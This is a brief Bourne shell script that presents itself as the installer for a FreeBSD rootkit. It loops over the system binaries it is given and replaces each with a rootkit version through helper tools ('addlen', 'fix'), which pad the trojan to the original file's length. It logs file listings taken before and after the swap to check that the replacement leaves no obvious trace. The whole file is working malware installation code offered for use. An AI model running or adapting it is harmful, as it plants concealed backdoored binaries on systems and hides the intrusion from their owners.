#!/bin/sh
# Installation script for the FreeBSD rootkit. Make as many changes as you like.

# Uncomment the below line if you want to backup the files.
BAKDIR=bak

rm before.log
rm after.log

for BIN; do
	echo `ls -laF $BIN` >> before.log
	PROG=`basename $BIN`
	echo -n "Installing $PROG. . ."
	RKBIN=$PROG/$PROG
	if [ -x $BIN ]; then
		./addlen $RKBIN $BIN
		./fix $BIN $RKBIN $BAKDIR
		echo `ls -laF $BIN` >> after.log
	fi
	echo "done."
done

echo "The installation is complete."
echo ""
echo "This is what thing looked like before:"
cat before.log
echo "This is what things look like now:"
cat after.log
